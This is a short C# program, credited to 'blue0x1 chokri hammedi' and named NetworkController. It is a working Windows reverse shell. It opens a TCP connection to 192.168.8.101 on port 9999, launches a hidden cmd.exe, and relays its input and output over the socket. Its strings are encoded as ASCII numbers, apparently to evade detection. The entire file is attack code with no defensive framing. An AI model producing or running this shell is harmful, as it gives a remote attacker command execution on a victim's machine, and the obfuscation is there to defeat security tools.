// written by blue0x1 chokri hammedi

using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

class NetworkController
{
    static async Task Main(string[] args)
    {
        const string serverIp = "192.168.8.101"; // ip 
        const int serverPort = 9999;             // port


        string decodedCommand = Decode("99 109 100 46 101 120 101"); // "cmd.exe"
        bool useShellExecute = bool.Parse(Decode("102 97 108 115 101")); // "false"
        bool createNoWindow = bool.Parse(Decode("116 114 117 101")); // "true"

        TcpClient client = new TcpClient(serverIp, serverPort);

        using (client)
        using (NetworkStream stream = client.GetStream())
        using (Process process = new Process())
        {
            process.StartInfo.FileName = decodedCommand;
            process.StartInfo.UseShellExecute = useShellExecute;
            process.StartInfo.RedirectStandardOutput = !useShellExecute;
            process.StartInfo.RedirectStandardInput = !useShellExecute;
            process.StartInfo.RedirectStandardError = !useShellExecute;
            process.StartInfo.CreateNoWindow = createNoWindow;

            process.Start();


            var outputTask = Task.Run(() => process.StandardOutput.BaseStream.CopyToAsync(stream));
            var errorTask = Task.Run(() => process.StandardError.BaseStream.CopyToAsync(stream));


            await stream.CopyToAsync(process.StandardInput.BaseStream);


            process.WaitForExit();


            await outputTask;
            await errorTask;
        }
    }

    static string Decode(string encoded)
    {
        var decoded = new StringBuilder();
        var numbers = encoded.Split(' ');
        foreach (var number in numbers)
        {
            if (int.TryParse(number, out int asciiCode))
            {
                decoded.Append((char)asciiCode);
            }
        }
        return decoded.ToString();
    }


}
